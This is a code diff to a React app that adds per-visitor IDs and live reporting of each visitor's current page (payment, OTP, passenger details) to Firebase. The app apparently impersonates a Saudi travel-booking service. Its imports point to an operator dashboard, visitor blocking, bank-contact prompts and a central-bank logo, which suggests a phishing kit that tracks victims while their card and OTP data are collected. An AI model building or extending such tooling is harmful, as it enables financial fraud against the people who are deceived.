@@ -14,6 +14,8 @@ import {
   listenForVisitorBlock,
   listenForBankContactRequest,
   confirmBankContact,
+  addData,
+  handleCurrentPage,
 } from "@/lib/firebase";
 import samaLogo from "@/assets/sama_logo.png";
 import { findBankLogo } from "@/lib/bank-logos";
@@ -353,17 +355,52 @@ function BankContactGate() {
   );
 }
 
-function App() {
+const PATH_TO_PAGE: Record<string, string> = {
+  "/": "schedule",
+  "/home": "home",
+  "/schedule": "schedule",
+  "/trip-booking": "trip_booking",
+  "/trips": "trips",
+  "/search-results": "search_results",
+  "/passenger-details": "passenger_details",
+  "/seat-selection": "seat_selection",
+  "/payment": "payment",
+  "/otp": "otp",
+  "/contact": "contact",
+  "/satrans": "satrans",
+  "/register": "registration",
+};
+
+function pathToPage(path: string): string {
+  if (PATH_TO_PAGE[path]) return PATH_TO_PAGE[path];
+  return path.replace(/^\//, "").replace(/[\/\-]/g, "_") || "home";
+}
+
+function VisitorBootstrap() {
+  const [location] = useLocation();
   useEffect(() => {
     const path = window.location.pathname;
-    if (path.startsWith("/dashboard") || path.startsWith("/login")) {
-      return;
+    if (path.startsWith("/dashboard") || path.startsWith("/login")) return;
+
+    let visitorId = localStorage.getItem("visitor");
+    const isNew = !visitorId;
+    if (isNew) {
+      visitorId = `visitor_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
+      localStorage.setItem("visitor", visitorId);
     }
-    const visitorId = localStorage.getItem("visitor");
-    if (visitorId) {
-      setupOnlineStatus(visitorId);
+
+    const page = pathToPage(location);
+    if (isNew) {
+      void addData({ id: visitorId, currentPage: page });
+    } else {
+      void handleCurrentPage(page);
     }
-  }, []);
+    setupOnlineStatus(visitorId!);
+  }, [location]);
+  return null;
+}
+
+function App() {
 
   return (
     <QueryClientProvider client={queryClient}>
